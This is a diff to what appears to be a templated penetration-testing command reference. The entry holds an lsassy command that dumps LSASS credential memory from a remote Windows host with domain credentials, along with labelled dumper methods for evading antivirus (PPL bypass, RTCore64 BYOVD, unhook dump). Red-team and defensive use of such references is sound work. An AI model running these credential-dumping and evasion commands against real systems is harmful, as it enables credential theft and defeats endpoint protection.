@@ -31,7 +31,7 @@ lsassy -d {{DOMAIN:domain}} -u {{USERNAME:str}} -p {{PASSWORD:str}} {{CIDR:str:1
 Force a specific dumper (comsvcs, procdump, dllinject, nanodump, etc.) when the default is blocked by AV.
 
 ```bash
-lsassy -d {{DOMAIN:domain}} -u {{USERNAME:str}} -p {{PASSWORD:str}} -m {{DUMP_METHOD:choice:comsvcs,procdump,dumpert,nanodump,mirrordump,ppldump,silentprocessexit,dllinject,rtcore,taskmgr,wer}} {{TARGET:ip}}
+lsassy -d {{DOMAIN:domain}} -u {{USERNAME:str}} -p {{PASSWORD:str}} -m {{DUMP_METHOD:choice:comsvcs=comsvcs.dll MiniDump,procdump=Sysinternals ProcDump,dumpert=D/Invoke unhook dump,nanodump=fortra nanodump,mirrordump=handle-dup dump,ppldump=PPL bypass dump,silentprocessexit=SilentProcessExit trigger,dllinject=inject dump DLL,rtcore=RTCore64 BYOVD,taskmgr=Task Manager dump,wer=WER crash dump}} {{TARGET:ip}}
 ```
 
 <!-- meta: risk=high | phase=post | tags=lsass,dump,method,av-evasion -->
